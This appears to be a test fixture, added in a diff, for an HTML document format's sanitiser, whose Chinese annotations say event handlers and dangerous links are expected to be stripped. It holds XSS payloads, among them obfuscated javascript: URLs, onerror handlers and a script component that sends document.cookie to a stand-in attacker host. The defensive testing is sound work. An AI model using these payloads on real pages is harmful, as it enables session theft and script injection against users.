@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="zh-CN" data-eh-version="0.1">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>安全清洗</title>
+  <script type="application/json" id="eh-meta">{"title":"安全清洗","created":"2026-11-22","tags":["security"],"theme":"default"}</script>
+  <script id="eh-runtime" src="./.ehtml/runtime.js" defer></script>
+</head>
+<body>
+  <main id="eh-doc">
+    <p data-eh="x1" onclick="alert('p')">段落上的 onclick 应被剔除。</p>
+    <h2 data-eh="x2" onmouseover="steal()" ONFOCUS="x()">标题上的 on* 属性（含大写）应被剔除</h2>
+    <p data-eh="x3">链接：<a href="javascript:alert(1)">javascript: 链接</a>、<a href="JaVaScRiPt:alert(2)">大小写混合</a>、<a href="  javascript:alert(3)">前导空格</a>、<a href="java&#x09;script:alert(4)">实体编码的制表符</a>、<a href="&#106;avascript:alert(5)">数字实体</a>。</p>
+    <p data-eh="x4">其他协议：<a href="vbscript:msgbox(1)">vbscript</a>、<a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">data:text/html</a>、<a href="https://example.com" onclick="evil()">正常链接但带 onclick</a>。</p>
+    <figure data-eh="x5"><img alt="坏图" onerror="alert('img')" src="x.png" onload="alert(2)"><figcaption onclick="c()">图片上的 onerror/onload</figcaption></figure>
+    <ul data-eh="x6">
+      <li onclick="a()">列表项上的 onclick</li>
+      <li data-eh-task="todo">任务项 <strong onmouseenter="b()">粗体上的事件</strong></li>
+    </ul>
+    <p data-eh="x7"><span data-eh-inline="tag" onclick="t()">#tag</span> 扩展行内元素上的事件属性。</p>
+    <eh-callout data-eh="x8" onclick="alert('component')">
+      <script type="application/json">{"kind":"warn","title":"组件元素上的 onclick"}</script>
+      <eh-slot data-eh-slot="0" onclick="alert('slot')">
+        <p data-eh="x8a">eh-slot 与组件元素上的 on* 属性也应剔除（规范 §9 只提到文本块）。</p>
+      </eh-slot>
+    </eh-callout>
+    <eh-script data-eh="x9">
+      <script type="application/json">{"html":"<p>不受信任的脚本组件</p>","css":"","js":"fetch('https://evil.example.invalid/?c='+document.cookie)"}</script>
+      <!--eh:fallback--><p>（脚本组件默认不执行，需点击“信任此文件”）</p><!--eh:fallback-->
+    </eh-script>
+    <p data-eh="x10">预期：保存后所有 on* 属性与危险 href 消失，文本与其余结构保留。</p>
+  </main>
+</body>
+</html>
